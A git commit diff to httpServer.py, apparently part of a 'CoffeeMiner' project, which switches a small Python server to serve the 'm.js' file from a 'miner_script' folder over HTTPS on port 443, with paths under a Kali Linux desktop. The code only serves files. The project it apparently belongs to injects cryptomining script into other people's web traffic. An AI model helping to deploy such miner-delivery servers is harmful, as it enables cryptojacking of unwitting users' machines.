a47f308092acc9884a9392aa75a57c4f41b7bd4b
Gohsty <89268998+Gohstys@users.noreply.github.com>
2023-10-24 19:17:03 +0200

    httpServer.py

--- httpServer.py
+++ httpServer.py
@@ -6,26 +6,30 @@ import ssl
 
 PORT = 443
 
-web_dir = os.path.join(os.path.dirname(__file__), 'miner_script')
+web_dir = os.path.join(os.path.dirname(__file__), '/home/kali/Desktop/CoffeeMiner2/miner_script/')
 os.chdir(web_dir)
 
+# Especifica el nombre del archivo JavaScript
+js_file = 'm.js'
 
-# Clave privada y certificado en formato PEM
-certfile = '/ruta/al/certificado.pem'
-keyfile = '/ruta/a/clave-privada.pem'
+# La ruta completa al archivo JavaScript
+js_path = os.path.join(web_dir, js_file)
 
-# Configura el contexto SSL
-context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
-context.load_cert_chain(certfile, keyfile)
+
+
+certfile = '/home/kali/Desktop/CoffeeMiner2/cert.pem'
+keyfile = '/home/kali/Desktop/CoffeeMiner2/key.pem'
 
 
 
 Handler = http.server.SimpleHTTPRequestHandler
 
+# Configura el contexto SSL y carga los certificados
+context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+context.load_cert_chain(certfile="/home/kali/Desktop/CoffeeMiner2/certificate.crt", keyfile="/home/kali/Desktop/CoffeeMiner2/private.key")
+
 httpd = socketserver.TCPServer(("", PORT), Handler)
+httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
 
-# Cargar el certificado y la clave
-httpd.socket = ssl.wrap_socket(httpd.socket, certfile='./server.crt', keyfile='./server.key', server_side=True)
-
-print("serving at port", PORT)
+print("Serving at port", PORT)
 httpd.serve_forever()
